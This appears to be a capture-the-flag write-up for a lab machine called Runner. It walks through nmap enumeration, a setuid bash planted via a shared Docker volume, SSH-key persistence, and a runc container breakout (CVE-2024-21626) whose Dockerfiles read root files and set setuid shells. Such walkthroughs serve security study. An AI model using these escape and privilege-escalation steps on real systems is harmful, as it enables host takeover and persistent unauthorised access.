## Runner - Linux

**Difficulty:** Medium
**OS:** Linux

## Enumeration

A standard nmap sweep turned up three ports, two expected and one a bit odd for a webserver.

```shell
sudo nmap -sC -sV 10.129.48.208

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
8000/tcp open  nagios-nsca Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, a web server redirecting somewhere, and a high port nmap thinks might be Nagios. Spoiler, it isn't.

## Escalating to matthew via a Mounted Volume

Poking around the filesystem, `/data` turned out to be a shared mount point between the host and the TeamCity Docker container. That's a huge deal, anything written to it from inside the container shows up on the host too, and file ownership can get muddled in interesting ways.

The trick here is straightforward. Copy a bash binary into that shared folder, make it world executable, and flip the setuid bit.

```shell
pwd
/data/teamcity_server/datadir

cp /bin/bash .
chmod 777 ./bash
chmod u+s ./bash
```

Back on the host as `john`, that same file shows up owned by `matthew`, since it was created from inside the container under a different UID mapping.

```shell
john@runner:/data/teamcity_server/datadir$ ls -la
-rwsrwxrwx 1 matthew matthew 1183448 Apr 20 19:49 bash
```

Running it with `-p` to keep the privileges intact hands over an effective UID of `matthew`.

```shell
john@runner:/data/teamcity_server/datadir$ ./bash -p
bash-5.0$ id
uid=1001(john) gid=1001(john) euid=1000(matthew) groups=1001(john)
bash-5.0$
```

## Setting Up Persistence

Not strictly necessary for the flags, but I like having a clean way back in rather than relying on a setuid binary I might lose. Dropped my own public key into a fresh `.ssh` directory with the right permissions.

```shell
bash-5.0$ mkdir .ssh
bash-5.0$ cd .ssh
bash-5.0$ echo 'ssh-rsa AAAA...' > authorized_keys
bash-5.0$ chmod 600 authorized_keys
bash-5.0$ cd ..
bash-5.0$ chmod 700 .ssh
```

```shell

matthew@runner:~$
```

## Root via CVE-2024-21626

With a working password, logging into Portainer through the subdomain we found earlier was next.

- [https://labs.withsecure.com/publications/runc-working-directory-breakout-cve-2024-21626](https://labs.withsecure.com/publications/runc-working-directory-breakout-cve-2024-21626)

Portainer is a web based management UI for Docker, and this instance had the Docker socket mounted, meaning it could genuinely control the host's containers. That combination, plus a vulnerable runc version, is exactly what CVE-2024-21626 abuses. The bug lets you set a container's working directory to a file descriptor left open by runc during image build, which points back out at the host filesystem, breaking the isolation entirely.

From the dashboard I clicked into Live connect, then Images, then Build a new image, and dropped in a Dockerfile designed to escape the container the moment it builds.

```shell
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/root.txt
```

The build log ends up echoing the contents of the file back to us.

## root.txt

```shell
Step 3/3 : RUN cd ../../../../ &&     ls /root && cat root/root.txt

sh: 0: getcwd() failed: No such file or directory

c3c9e3b33626f14a774061245d7ce449

Successfully built 42f6a7ea82dc
```

## Grabbing root's SSH Key

Root flag in hand, I wanted an actual shell rather than one off file reads through build logs, so I tried the same trick against root's private key.

```shell
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/.ssh/id_rsa
```

It worked, and the key printed straight into the build output.

```shell
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApxRKdFjSiNCJZC0bx2QPGESZOkMyPXlWtOvWNdx6KFGU3Qd6LXUO
... snipped for length ...
MqhvS/eaT9GrEAAAALcm9vdEBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

Unfortunately, the key on its own turned out to be useless, `root`'s `authorized_keys` on the host didn't actually list it, so straight SSH access was off the table. Time for a more direct approach.

There's also a cleanup script running on this box that resets container mount changes fairly quickly, so speed mattered. My first attempt tried to grab the flag and set a setuid bit on bash in the same build, before cleanup could kick in.

```shell
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/root.txt && \
    chmod u+s ../../../../../../../bin/bash
```

That's a bit fragile though, since it modifies the real system bash in place. A cleaner, more permanent version copies bash to a second binary first and sets the setuid bit on the copy instead, leaving the original untouched and giving a stable setuid shell to come back to.

```shell
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/root.txt && \
    cp ../../../../../../../bin/bash ../../../../../../../bin/bash2 && \
    chmod u+s ../../../../../../../bin/bash2
```

With that in place, `/bin/bash2 -p` on the host gives a stable root shell any time it's needed, no more racing the cleanup job.
